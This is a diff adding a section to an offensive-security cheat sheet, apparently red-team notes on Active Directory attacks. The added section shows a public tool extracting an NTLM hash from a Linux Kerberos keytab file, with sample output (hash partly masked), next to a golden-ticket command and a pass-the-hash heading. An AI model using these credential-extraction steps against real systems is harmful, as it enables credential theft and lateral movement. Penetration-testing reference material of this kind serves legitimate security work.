@@ -285,6 +285,23 @@ kerberos::golden /user:Hitman /domain:DOMAIN /sid:DOMAIN-SID /krbtgt:HASH /ticke
 ```
 
 &nbsp;
+
+**[+] Extract User/NTLM from keytab file (Linux)**
+
+```bash
+// https://github.com/sosdave/KeyTabExtract
+
+└─# python3 keytabextract.py sql.keytab      
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.
+[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
+[+] Keytab File successfully imported.
+        REALM : it.gcb.local
+        SERVICE PRINCIPAL : sqlsvc/
+        NTLM HASH : 7782dXXXXXXXXXXXXXXXXXXX :D
+```
+
+&nbsp;
 &nbsp;
 
 ## Pass the hash
